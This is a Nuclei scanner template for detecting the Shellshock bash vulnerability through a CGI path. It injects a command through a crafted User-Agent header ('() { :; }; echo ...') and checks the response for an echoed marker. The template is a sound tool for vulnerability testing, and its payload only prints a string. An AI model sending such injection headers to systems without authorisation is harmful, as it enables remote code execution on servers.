id: shellshock-vulnerability-nuclei

info:
  author: me
  name: Shellshock - Remote Code Injection via CGI
  severity: critical
  description: Shellshock vulnerability detection
  tags: shellshock,bash,vulnerabilities

variables:
  rand: "{{randstr}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/vulnerable"
    headers:
      User-Agent: '() { :; }; echo -e "Content-type: text/plain\n"; echo {{rand}} SHELLSHOCK VULNERABILITY NUCLEI; exit'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "contains(body, '{{rand}} SHELLSHOCK VULNERABILITY NUCLEI')"